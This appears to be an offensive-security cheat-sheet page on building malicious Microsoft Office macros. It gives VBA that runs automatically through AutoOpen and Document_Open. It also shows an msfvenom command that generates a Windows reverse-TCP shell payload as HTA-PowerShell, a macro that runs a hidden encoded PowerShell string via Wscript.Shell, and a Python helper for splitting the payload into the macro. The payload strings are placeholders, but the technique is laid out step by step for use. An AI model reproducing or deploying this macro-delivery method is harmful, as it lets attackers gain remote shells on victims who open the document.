# Microsoft Office

> Macro malware (sometimes known as macro viruses) takes advantage of the VBA (Visual Basic for Applications) programming in Microsoft Office macros to spread viruses, worms, and other forms of malware.

In order to create a Macro, we need to go to: **View > Macro**. Once in the code, make use of AutoOpen() and Document_Open() procedures in order to activate the macro when the document is open or re-opened.

```bash
# Executed when the document is opened
Sub AutoOpen()
  NewMacro
End Sub
#Executed when an already-open document is reopened.
Sub Document_Open()
  NewMacro
End Sub
#Main function (shellcode function)
Sub NewMacro()

End Sub
```

**Note:** Document should be saved as .docm or .doc  formats, .docx format doesn't support macros.

## Generating shellcode

```bash
#-f: Output file is HTA to Powershell.
msfvenom -p windows/shell_reverse_tcp LHOST=$IPADDRESS LPORT=$PORT -f hta-psh -o /var/www/html/$FILENAME.hta
```

Once the shellcode has been created, we need to edit the Macro as following:

```bash
Sub AutoOpen()
  NewMacro
End Sub
Sub Document_Open()
  NewMacro
End Sub
Sub NewMacro()
  #Create a String variable that will hold our shellcode:
  Dim Str As String
  #Paste shellcode here:
  Str = "powershell.exe -nop -w hidden -e 9038402JKLADFJ.."
  Str += "jhad9u01ehfkjna81neja..........................."
  Str += "................................................"
  #Invoke Windows Host Script in order to execute this string
  CreateObject("Wscript.Shell").Run Str
End Sub
```

## Format the output

```bash
str = "powershell.exe -nop -w ......."
n = 50

for i in range(0, len(str), n):
        print "Str = Str + " + '"' + str[i:i+n] + '"'
```
